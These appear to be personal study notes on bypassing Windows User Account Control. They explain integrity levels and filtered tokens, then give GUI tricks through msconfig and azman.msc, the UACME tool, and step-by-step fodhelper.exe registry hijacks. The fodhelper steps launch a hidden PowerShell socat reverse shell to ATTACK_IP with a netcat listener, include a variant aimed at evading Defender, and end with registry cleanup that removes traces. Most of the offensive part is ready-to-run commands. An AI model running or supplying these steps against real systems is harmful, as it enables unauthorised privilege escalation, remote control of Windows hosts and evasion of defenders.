# INTEGRITY LEVELS (IL)

### Low = Generally used for interaction with the Internet. Has very limited permissions.

### Medium = Assigned to standard users and Administrators' filtered tokens.

### High = Used by Administrators' elevated tokens if UAC is disabled. All administrators will always use a high IL token.

### System = Reserved for system use.

# FILTERED TOKENS

### Non-administrators: Will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.

### Administrators: Filtered token = A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.

### Elevated Token = Full admin privileges. High IL.

# GUI BASED UAC BYPASS

## msconfig

#### 1) Run 

#### 2) msconfig

#### 3) System Configutation -> Tools

#### 4) Launch cmd.exe

## azman.msc

#### 1) Run

#### 2) azman.msc

#### 3) Authorization Manager -> Help -> Help Topics

#### 4) Right-click -> View Source (Spawns notepad process)

#### 5) File -> Open

#### 6) All files

#### 7) Search cmd.exe

#### 8) Open cmd.exe

# AUTOMATION

### Tool: UACMEAkagi64.exe

#### options: 

#### 33 = fodhelper.exe

#### 34 Disk Cleanup scheduled Task

#### 70 fodhelper.exe using CurVer registry key

# AUTO-ELEVATE

### Verification

#### sigcheck64.exe -m c:\path\to\file.exe

# FODHELPER

#### 1) whoami

#### 2) net user USER | find "Local Group"

#### 3) whoami /groups | find "Label"

#### 4) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

#### 5) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 6) reg add %REG_KEY% /v "DelegateExecute" /d "" /f

#### 7) reg add %REG_KEY% /d %CMD% /f

#### 8) Attacker: nc -lvp PORT 

#### 9) fodhelper.exe

#### 10) red delete HKCU\Software\Classes\ms-settings\ /f (Cleanup)

# BYPASS DEFENDER WITH FODHELPER

#### 1) set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

#### 2) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 3) reg add %REG_KEY% /v "DelegateExecute" /d "" /f

#### 4) reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

#### 5) nc -lvnp PORT 

# IMPROVED FODHELPER EXPLOIT

#### 1) set CMD="powershell -windowstyle hidden c:\tools\socat.exe TCP:ATTACK_IP:PORT EXEC:cmd.exe,pipes"

#### 2) reg add "HKCU\Software\Classes\.jim\Shell\Open\command" /d %CMD% /f

#### 3) reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jim" /f

#### 4) fodhelper.exe

#### 5) nc -lvp PORT

#### 6) reg delete "HKCU\Software\Classes\.jim\" /f (Cleanup)

#### reg delete "HKCU\Software\Classes\ms-settings" /f (Cleanup)

